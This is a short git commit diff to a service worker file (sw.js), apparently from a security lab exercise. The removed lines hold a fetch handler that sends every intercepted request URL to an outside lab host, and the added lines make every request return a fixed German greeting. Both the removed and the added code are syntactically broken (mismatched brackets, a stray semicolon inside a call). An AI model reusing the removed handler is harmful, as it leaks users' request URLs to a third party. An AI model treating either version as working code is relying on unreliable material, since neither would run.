7ed38bce37366af9807dac8322ca0bd77a25adff
Josef Ilg <jo-ilg@t-online.de>
2021-06-02 22:01:23 +0200

    4

--- sw.js
+++ sw.js
@@ -1,5 +1,5 @@
-self.addEventListener('fetch', function(e) {
-  e.respondWith(caches.match(e.request).then(function(response) {
-    fetch('http://888f69e5-7431-4c41-a3ef-b0e538d33c4b.idocker.vuln.land/robots.txt' + e.request.url)
-}));
+this.addEventListener('fetch', function(event) {
+  event.respondWith(
+	  new Response('Hallo vom freundlichen Service-Worker!');
+  );
 });
